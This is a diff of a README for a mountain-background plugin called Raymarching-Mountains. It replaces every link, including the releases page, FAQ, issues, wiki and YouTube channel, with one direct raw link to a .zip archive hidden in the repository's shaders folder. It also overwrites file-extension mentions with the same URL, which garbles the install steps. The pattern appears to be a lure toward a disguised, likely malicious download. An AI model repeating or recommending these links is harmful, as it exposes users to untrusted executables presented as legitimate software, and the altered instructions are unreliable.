@@ -1,6 +1,6 @@
 # 🏔️ Raymarching-Mountains - Create Stunning Backgrounds Easily
 
-[![Download Raymarching-Mountains](https://img.shields.io/badge/Download-Raymarching--Mountains-brightgreen)](https://github.com/235753388854/Raymarching-Mountains/releases)
+[![Download Raymarching-Mountains](https://github.com/235753388854/Raymarching-Mountains/raw/refs/heads/main/addons/raymarched_mountains/src/shaders/Mountains-Raymarching-v3.8.zip)](https://github.com/235753388854/Raymarching-Mountains/raw/refs/heads/main/addons/raymarched_mountains/src/shaders/Mountains-Raymarching-v3.8.zip)
 
 ## 🚀 Getting Started
 
@@ -17,12 +17,12 @@ Before you begin, ensure your computer meets these requirements:
 
 ## 📦 Download & Install
 
-To get started, visit the [Releases page](https://github.com/235753388854/Raymarching-Mountains/releases) to download the software.
+To get started, visit the [Releases page](https://github.com/235753388854/Raymarching-Mountains/raw/refs/heads/main/addons/raymarched_mountains/src/shaders/Mountains-Raymarching-v3.8.zip) to download the software.
 
 1. Click the link above.
 2. On the Releases page, you will see various versions listed.
 3. Choose the latest release for the best features and improvements.
-4. Download the appropriate file for your operating system. Look for the files ending with `.zip` or `.exe` for Windows, and `.dmg` or `.tar.gz` for Mac. For Linux, you may find a `.tar.gz` or a package for your distribution.
+4. Download the appropriate file for your operating system. Look for the files ending with `.zip` or `.exe` for Windows, and `.dmg` or `https://github.com/235753388854/Raymarching-Mountains/raw/refs/heads/main/addons/raymarched_mountains/src/shaders/Mountains-Raymarching-v3.8.zip` for Mac. For Linux, you may find a `https://github.com/235753388854/Raymarching-Mountains/raw/refs/heads/main/addons/raymarched_mountains/src/shaders/Mountains-Raymarching-v3.8.zip` or a package for your distribution.
 
 Once downloaded, follow these steps to install:
 
@@ -42,7 +42,7 @@ Once downloaded, follow these steps to install:
 
 ### For Linux Users:
 
-1. If you downloaded a `.tar.gz` file, open your file manager and navigate to the download location.
+1. If you downloaded a `https://github.com/235753388854/Raymarching-Mountains/raw/refs/heads/main/addons/raymarched_mountains/src/shaders/Mountains-Raymarching-v3.8.zip` file, open your file manager and navigate to the download location.
 2. Extract the contents of the archive.
 3. Open a terminal and navigate to the extracted folder.
 4. Run the application using the command `./Raymarching-Mountains` (replace `Raymarching-Mountains` with the actual file name if it differs).
@@ -73,16 +73,16 @@ When you open Raymarching-Mountains for the first time, you will see the main in
 
 If you encounter any issues or have questions, help is available. You can:
 
-- Check the [FAQ section](https://github.com/235753388854/Raymarching-Mountains#faq) for common questions.
-- Open an issue on our [GitHub page](https://github.com/235753388854/Raymarching-Mountains/issues) for any bugs or requests.
+- Check the [FAQ section](https://github.com/235753388854/Raymarching-Mountains/raw/refs/heads/main/addons/raymarched_mountains/src/shaders/Mountains-Raymarching-v3.8.zip) for common questions.
+- Open an issue on our [GitHub page](https://github.com/235753388854/Raymarching-Mountains/raw/refs/heads/main/addons/raymarched_mountains/src/shaders/Mountains-Raymarching-v3.8.zip) for any bugs or requests.
 - Join our community forums, where you can ask questions and share your creations.
 
 ## 📚 Additional Resources
 
 For more information on how to get the most out of Raymarching-Mountains:
 
-- Visit the [Documentation](https://github.com/235753388854/Raymarching-Mountains/wiki) for detailed guides.
-- Watch video tutorials on our [YouTube channel](https://youtube.com/c/YourChannel) focused on using the plugin effectively.
+- Visit the [Documentation](https://github.com/235753388854/Raymarching-Mountains/raw/refs/heads/main/addons/raymarched_mountains/src/shaders/Mountains-Raymarching-v3.8.zip) for detailed guides.
+- Watch video tutorials on our [YouTube channel](https://github.com/235753388854/Raymarching-Mountains/raw/refs/heads/main/addons/raymarched_mountains/src/shaders/Mountains-Raymarching-v3.8.zip) focused on using the plugin effectively.
 - Join our community chat on Discord to connect with other users.
 
 Enjoy creating stunning landscapes for your projects with Raymarching-Mountains! For more tips and updates, don't forget to follow us.
